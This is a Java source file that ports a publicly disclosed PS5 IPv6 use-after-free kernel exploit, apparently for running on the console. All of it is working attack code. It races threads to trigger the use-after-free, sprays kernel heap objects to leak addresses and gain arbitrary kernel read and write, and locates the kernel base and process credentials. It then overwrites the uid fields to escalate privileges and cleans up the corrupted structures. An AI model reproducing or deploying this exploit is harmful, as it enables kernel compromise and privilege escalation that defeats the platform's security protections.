// Java port of the ps5 ipv6 use after free exploit disclosed by theflow at:
// https://hackerone.com/reports/826026

public class KernelExploit {

    // Define libc macros
    private static final int AF_INET6 = 28;
    private static final int SOCK_DGRAM = 2;
    private static final int IPPROTO_UDP = 17;
    private static final int IPPROTO_IPV6 = 41;
    private static final int IPV6_TCLASS = 61;
    private static final int IPV6_RTHDR_TYPE_0 = 0;
    private static final int IPV6_RTHDR = 51;
    private static final int IPV6_PKTINFO = 46;
    private static final int IPV6_2292PKTOPTIONS = 25;
    private static final int O_RDWR = 2;
    private static final int SEEK_SET = 0;
    private static final int PAGE_SIZE = 16384;
    private static final int DTYPE_SOCKET = 2;
    private static final int EVFILT_READ = -1;
    private static final int EV_ADD = 1;

    // Define auxillary macros
    private static final int ELF_MAGIC = 0x464c457f;

    private static final int TCLASS_MASTER = 0x13370000;
    private static final int TCLASS_TAINT = 0x42;
    private static final int TCLASS_SPRAY = 0x41;

    private static final int NUM_SPRAY_RACE = 0x20;
    private static final int NUM_SPRAY = 0x100;
    private static final int NUM_KQUEUES = 0x100;

    private static final int IN6_PKTINFO_SIZE = 20;
    private static final int FILEDESCENT_SIZE = 48;
    private static final int KEVENT_SIZE = 64;

    private static final int ALLPROC_OFFSET = 0x1df3c38;

    private static final int PKTOPTS_PKTINFO_OFFSET = 16;
    private static final int PKTOPTS_RTHDR_OFFSET = 112;
    private static final int PKTOPTS_TCLASS_OFFSET = 192;
    private static final int PROC_LIST_OFFSET = 0;
    private static final int PROC_UCRED_OFFSET = 64;
    private static final int PROC_FD_OFFSET = 72;
    private static final int PROC_PID_OFFSET = 188;
    private static final int FILEDESC_FILES_OFFSET = 0;
    private static final int FILEDESCENTTBL_OFILES_OFFSET = 8;
    private static final int FILEDESCENTTBL_NFILES_OFFSET = 0;
    private static final int FILEDESCENT_FILE_OFFSET = 0;
    private static final int FILE_TYPE_OFFSET = 32;
    private static final int FILE_DATA_OFFSET = 0;
    private static final int KNOTE_FOP_OFFSET = 152;
    private static final int FILTEROPS_DETACH_OFFSET = 16;
    private static final int SOCKET_PCB_OFFSET = 216;
    private static final int INPCB_OUTPUTOPTS_OFFSET = 312;

    static long kernel_base;
    static long p_ucred, p_fd;
    static long kevent_addr, pktopts_addr;

    static int kevent_sock, master_sock, overlap_sock, victim_sock;
    static int[] spray_sock = new int[NUM_SPRAY];
    static int[] kq = new int[NUM_KQUEUES];

    private static void hexDump(long data, int size) {
	int i;
	for(i = 0; i < size; i++) {
	    if((i%16 == 0) && i != 0) {
		System.out.print("\n");
	    }
	    
	    System.out.printf("%02X ", NativeMemory.getByte(data+i));
	}
	System.out.print("\n");
    }
    
    private static int new_socket() {
	return libkernel.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    }

    private static void build_tclass_cmsg(long buf, int val) {
	NativeMemory.putInt(buf + 0x00, 20);
	NativeMemory.putInt(buf + 0x04, IPPROTO_IPV6);
	NativeMemory.putInt(buf + 0x08, IPV6_TCLASS);
	NativeMemory.putInt(buf + 0x10, val);
    }

    private static int build_rthdr_msg(long buf, int size) {
	int len;

	len = ((size >> 3) - 1) & ~1;
	size = (len + 1) << 3;

	NativeMemory.setMemory(buf, size, (byte)0);
	NativeMemory.putByte(buf + 0, (byte)0);
	NativeMemory.putByte(buf + 1, (byte)len);
	NativeMemory.putByte(buf + 2, (byte)IPV6_RTHDR_TYPE_0);
	NativeMemory.putByte(buf + 3, (byte)(len >> 1));

	return size;
    }

    private static int get_rthdr(int s, long buf, int len) {
	long addr = NativeMemory.allocateMemory(4);
	NativeMemory.putInt(addr, len);
	int ret = libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, addr);
	NativeMemory.freeMemory(addr);
	return ret;
    }

    private static int set_rthdr(int s, long buf, int len) {
	return libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    private static int free_rthdr(int s) {
	return set_rthdr(s, 0, 0);
    }

    private static int get_tclass(int s) {
	int val;

	long p_val = NativeMemory.allocateMemory(4);
	long p_len = NativeMemory.allocateMemory(4);

	NativeMemory.putInt(p_len, 4);
	libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, p_len);
	val = NativeMemory.getInt(p_val);

	NativeMemory.freeMemory(p_val);
	NativeMemory.freeMemory(p_len);

	return val;
    }

    private static int set_tclass(int s, int val) {
	long p_val = NativeMemory.allocateMemory(4);
	NativeMemory.putInt(p_val, val);
	int ret = libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, 4);
	NativeMemory.freeMemory(p_val);
	return ret;
    }

    private static int get_pktinfo(int s, long buf) {
	long p_len = NativeMemory.allocateMemory(4);
	NativeMemory.putInt(p_len, IN6_PKTINFO_SIZE);
	int ret = libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, p_len);
	NativeMemory.freeMemory(p_len);
	return ret;
    }

    private static int set_pktinfo(int s, long buf) {
	return libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, IN6_PKTINFO_SIZE);
    }

    private static int set_pktopts(int s, long buf, int len) {
	return libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len);
    }

    private static int free_pktopts(int s) {
	return set_pktopts(s, 0, 0);
    }

    private static long leak_kmalloc(long buf, int size) {
	int rthdr_len = build_rthdr_msg(buf, size);
	set_rthdr(master_sock, buf, rthdr_len);
	get_rthdr(master_sock, buf, rthdr_len);
	return NativeMemory.getLong(buf + 0x00);
    }

    private static void write_to_victim(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	NativeMemory.putLong(buf + 0x00, addr);
	NativeMemory.putLong(buf + 0x08, 0);
	NativeMemory.putLong(buf + 0x10, 0);
	set_pktinfo(master_sock, buf);
	NativeMemory.freeMemory(buf);
    }

    private static int find_victim_sock() {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	int ret = -1;
	
	write_to_victim(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
	for(int i=0; i<NUM_SPRAY; i++) {
	    get_pktinfo(spray_sock[i], buf);
	    if(NativeMemory.getLong(buf + 0x00) != 0) {
		ret = i;
		break;
	    }
	}

	NativeMemory.freeMemory(buf);
	return ret;
    }

    private static short kread16(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	short ret;
	
	write_to_victim(addr);
	get_pktinfo(victim_sock, buf);
	ret = NativeMemory.getShort(buf);
	NativeMemory.freeMemory(buf);

	return ret;
    }

    private static int kread32(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	int ret;
	
	write_to_victim(addr);
	get_pktinfo(victim_sock, buf);
	ret = NativeMemory.getInt(buf);
	NativeMemory.freeMemory(buf);

	return ret;
    }

    private static long kread64(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	long ret;
	
	write_to_victim(addr);
	get_pktinfo(victim_sock, buf);
	ret = NativeMemory.getLong(buf);
	NativeMemory.freeMemory(buf);

	return ret;
    }

    private static void kwrite64(long addr, long val) {
	long buf = NativeMemory.allocateMemory(8);
	NativeMemory.putLong(buf, val);
	    
	int fd = libkernel.open("/dev/kmem", O_RDWR);
	if (fd >= 0) {
	    libkernel.lseek(fd, addr, SEEK_SET);
	    libkernel.write(fd, buf, 8);
	    libkernel.close(fd);
	}
	NativeMemory.freeMemory(buf);
    }

    private static int kwrite(long addr, long buf) {
	write_to_victim(addr);
	return set_pktinfo(victim_sock, buf);
    }

    private static long find_kernel_base(long addr) {
	addr &= ~(PAGE_SIZE - 1);
	while (kread32(addr) != ELF_MAGIC) {
	    addr -= PAGE_SIZE;
	}
	return addr;
    }

   
    private static int find_proc_cred_and_fd(int pid) {
	long proc = kread64(kernel_base + ALLPROC_OFFSET);

	while (proc != 0) {
	    if (kread32(proc + PROC_PID_OFFSET) == pid) {
		p_ucred = kread64(proc + PROC_UCRED_OFFSET);
		p_fd = kread64(proc + PROC_FD_OFFSET);
		System.out.println("[+] p_ucred: 0x" +  Long.toHexString(p_ucred));
		System.out.println("[+] p_fd: 0x" + Long.toHexString(p_fd));
		return 0;
	    }

	    proc = kread64(proc + PROC_LIST_OFFSET);
	}

	return -1;
    }

    private static long find_socket_data(int s) {
	long files, ofiles, fp;
	int nfiles;
	short type;

	files = kread64(p_fd + FILEDESC_FILES_OFFSET);
	if(files == 0) {
	    return 0;
	}

	ofiles = files + FILEDESCENTTBL_OFILES_OFFSET;

	nfiles = kread32(files + FILEDESCENTTBL_NFILES_OFFSET);
	if(s < 0 || s >= nfiles) {
	    return 0;
	}

	fp = kread64(ofiles + s * FILEDESCENT_SIZE + FILEDESCENT_FILE_OFFSET);
	if(fp == 0) {
	    return 0;
	}

	type = kread16(fp + FILE_TYPE_OFFSET);
	if(type != DTYPE_SOCKET) {
	    return 0;
	}

	return kread64(fp + FILE_DATA_OFFSET);
    }

    private static long find_socket_pcb(int s) {
	long f_data;

	f_data = find_socket_data(s);
	if (f_data == 0) {
	    return 0;
	}

	return kread64(f_data + SOCKET_PCB_OFFSET);
    }

    private static long find_socket_pktopts(int s) {
	long in6p;

	in6p = find_socket_pcb(s);
	if(in6p == 0) {
	    return 0;
	}

	return kread64(in6p + INPCB_OUTPUTOPTS_OFFSET);
    }

    private static void cleanup() {
	long master_pktopts, overlap_pktopts, victim_pktopts;

	master_pktopts  = find_socket_pktopts(master_sock);
	overlap_pktopts = find_socket_pktopts(overlap_sock);
	victim_pktopts  = find_socket_pktopts(victim_sock);

	kwrite64(master_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);
	kwrite64(overlap_pktopts + PKTOPTS_RTHDR_OFFSET, 0);
	kwrite64(victim_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);
    }

    private static void escalate_privileges() {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);

	NativeMemory.putByte(buf + 0x00, (byte)0); // cr_uid
	NativeMemory.putByte(buf + 0x04, (byte)0); // cr_ruid
	NativeMemory.putByte(buf + 0x08, (byte)0); // cr_svuid
	NativeMemory.putByte(buf + 0x0c, (byte)1); // cr_ngroups
	NativeMemory.putByte(buf + 0x10, (byte)0); // cr_rgid

	kwrite(p_ucred + 4, buf);

	NativeMemory.freeMemory(buf);
    }

    private static int find_overlap_sock() {
	set_tclass(master_sock, TCLASS_TAINT);

	for(int i=0; i<NUM_SPRAY; i++) {
	    if(get_tclass(spray_sock[i]) == TCLASS_TAINT) {
		return i;
	    }
	}
	return -1;
    }

    private static int spray_pktopts() {
	for(int i=0; i<NUM_SPRAY_RACE; i++) {
	    set_tclass(spray_sock[i], TCLASS_SPRAY);
	}
	
	if(get_tclass(master_sock) == TCLASS_SPRAY) {
	    return 1;
	}
	
	for(int i=0; i < NUM_SPRAY_RACE; i++) {
	    free_pktopts(spray_sock[i]);
	}
	
	return 0;
    }

    private static int trigger_uaf() {
	long triggered = NativeMemory.allocateMemory(1);
	NativeMemory.putByte(triggered, (byte)0);

	Thread th1 = new Thread(new Runnable() {
		public void run() {
		    long buf = NativeMemory.allocateMemory(24);
		    build_tclass_cmsg(buf, 0);

		    while (NativeMemory.getByte(triggered) == 0 &&
			   get_tclass(master_sock) != TCLASS_SPRAY) {
			set_pktopts(master_sock, buf, 24);
			libkernel.usleep(100);
		    }
		    NativeMemory.freeMemory(buf);
		    NativeMemory.putByte(triggered, (byte)0xff);
		}
	    });

	Thread th2 = new Thread(new Runnable() {
		public void run() {
		    while (NativeMemory.getByte(triggered) == 0 &&
			   get_tclass(master_sock) != TCLASS_SPRAY) {
			free_pktopts(master_sock);
			if(spray_pktopts() == 1) {
			    break;
			}
			libkernel.usleep(100);
		    }
		    NativeMemory.putByte(triggered, (byte)0xff);
		}
	    });

	th1.start();
	th2.start();

	while(true) {
	    if(spray_pktopts() == 1) {
		break;
	    }
	    libkernel.usleep(100);
	}

	NativeMemory.putByte(triggered, (byte)0xff);
	try {
	    th1.join();
	} catch (Throwable t) {
	}

	try {
	    th2.join();
	} catch (Throwable t) {
	}
	
	NativeMemory.freeMemory(triggered);
	
	return find_overlap_sock();
    }

    private static int fake_pktopts(long pktinfo) {
	long buf = NativeMemory.allocateMemory(0x100);
	int rthdr_len, tclass;

	// Free master_sock's pktopts
	free_pktopts(overlap_sock);

	// Spray rthdr's to refill master_sock's pktopts
	rthdr_len = build_rthdr_msg(buf, 0x100);
	for(int i=0; i<NUM_SPRAY; i++) {
	    NativeMemory.putLong(buf + PKTOPTS_PKTINFO_OFFSET, pktinfo);
	    NativeMemory.putInt(buf + PKTOPTS_TCLASS_OFFSET, TCLASS_MASTER | i);
	    set_rthdr(spray_sock[i], buf, rthdr_len);
	}

	tclass = get_tclass(master_sock);

	// See if pktopts has been refilled correctly
	if ((tclass & 0xffff0000) != TCLASS_MASTER) {
	    System.out.println("[-] Error could not refill pktopts.");
	    System.exit(1);
	}

	return tclass & 0xffff;
    }

    private static void leak_kevent_pktopts() {
	long buf = NativeMemory.allocateMemory(0x800);
	long kv = NativeMemory.allocateMemory(KEVENT_SIZE);
	
	NativeMemory.putLong(kv + 0x00, kevent_sock);
	NativeMemory.putShort(kv + 0x08, (short)EVFILT_READ);
	NativeMemory.putShort(kv + 0x0a, (short)EV_ADD);
	NativeMemory.putInt(kv + 0x0c, 0);
	NativeMemory.putLong(kv + 0x10, 5);
	NativeMemory.putLong(kv + 0x18, 0);
	
	// Free pktopts
	for(int i=0; i<NUM_SPRAY; i++) {
	    free_pktopts(spray_sock[i]);
	}

	// Leak 0x800 kmalloc addr
	kevent_addr = leak_kmalloc(buf, 0x800);
	System.out.println("[+] kevent_addr: 0x" + Long.toHexString(kevent_addr));

	// Free rthdr buffer and spray kevents to occupy this location
	free_rthdr(master_sock);
	for (int i=0; i<NUM_KQUEUES; i++) {
	    libkernel.kevent(kq[i], kv, 1, 0, 0, 0);
	}

	// Leak 0x100 kmalloc addr
	pktopts_addr = leak_kmalloc(buf, 0x100);
	System.out.println("[+] pktopts_addr: 0x" + Long.toHexString(pktopts_addr));

	// Free rthdr buffer and spray pktopts to occupy this location
	free_rthdr(master_sock);
	for (int i=0; i<NUM_SPRAY; i++) {
	    set_tclass(spray_sock[i], 0);
	}
    }

    public static void main(String[] args) {
	long knote, kn_fop, f_detach;
	int idx;

	System.out.println("[*] Initializing sockets...");

	kevent_sock = new_socket();
	master_sock = new_socket();

	for(int i=0; i<NUM_SPRAY; i++) {
	    spray_sock[i] = new_socket();
	}

	for(int i=0; i<NUM_KQUEUES; i++) {
	    kq[i] = libkernel.kqueue();
	}

	System.out.println("[*] Triggering UAF...");
	idx = trigger_uaf();
	if(idx == -1) {
	    System.out.println("[-] Error could not find overlap sock.");
	    return;
	}

	// master_sock and overlap_sock point to the same pktopts
	overlap_sock = spray_sock[idx];
	spray_sock[idx] = new_socket();
	System.out.println("[+] Overlap socket: " + overlap_sock + " ("  + idx + ")");

	// Reallocate pktopts
	for(int i=0; i<NUM_SPRAY; i++) {
	    free_pktopts(spray_sock[i]);
	    set_tclass(spray_sock[i], 0);
	}

	// Fake master pktopts
	idx = fake_pktopts(0);
	overlap_sock = spray_sock[idx];
	spray_sock[idx] = new_socket(); // use new socket so logic in spraying will be easier
	System.out.println("[+] Overlap socket: " + overlap_sock + " ("  + idx + ")");

	// Leak address of some kevent and pktopts
	leak_kevent_pktopts();

	// Fake master pktopts
	idx = fake_pktopts(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
	overlap_sock = spray_sock[idx];
	System.out.println("[+] Overlap socket: " + overlap_sock + " ("  + idx + ")");
	idx = find_victim_sock();
	if (idx == -1) {
	    System.out.println("[-] Error could not find victim sock.");
	    return;
	}

	victim_sock = spray_sock[idx];
	System.out.println("[+] Victim socket: " + victim_sock + " (" + idx + ")");

	System.out.println("[+] Arbitrary R/W achieved.");
	
	knote    = kread64(kevent_addr + kevent_sock * 8);
	kn_fop   = kread64(knote + KNOTE_FOP_OFFSET);
	f_detach = kread64(kn_fop + FILTEROPS_DETACH_OFFSET);

	System.out.println("[+] knote: 0x" + Long.toHexString(knote));
	System.out.println("[+] kn_fop: 0x" + Long.toHexString(kn_fop));
	System.out.println("[+] f_detach: 0x" + Long.toHexString(f_detach));
	
	System.out.println("[+] Finding kernel base...");
	kernel_base = find_kernel_base(f_detach);
	System.out.println("[+] Kernel base: 0x" + Long.toHexString(kernel_base));
	    
	System.out.println("[+] Finding process cred and fd...");
	find_proc_cred_and_fd(libkernel.getpid());

	System.out.println("[*] Escalating privileges...");
	escalate_privileges();
	    
	System.out.println("[*] Cleaning up...");
	cleanup();
	    
	System.out.println("[+] Done.");
    }
}
